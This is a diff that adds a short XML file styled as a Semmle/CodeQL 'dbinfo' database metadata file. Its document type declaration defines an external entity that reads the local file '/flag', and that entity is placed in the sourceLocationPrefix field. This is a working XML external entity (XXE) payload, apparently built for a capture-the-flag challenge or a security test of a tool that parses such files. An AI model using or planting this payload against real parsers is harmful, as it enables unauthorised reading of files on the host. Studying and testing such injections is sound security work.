@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE example [<!ENTITY flag SYSTEM "file:///flag" >]>
+<ns2:dbinfo xmlns:ns2="https://semmle.com/schemas/dbinfo">
+    <sourceLocationPrefix>&flag;</sourceLocationPrefix>
+    <unicodeNewlines>false</unicodeNewlines>
+    <columnKind>utf16</columnKind>
+    <primaryLanguage>java</primaryLanguage>
+</ns2:dbinfo>
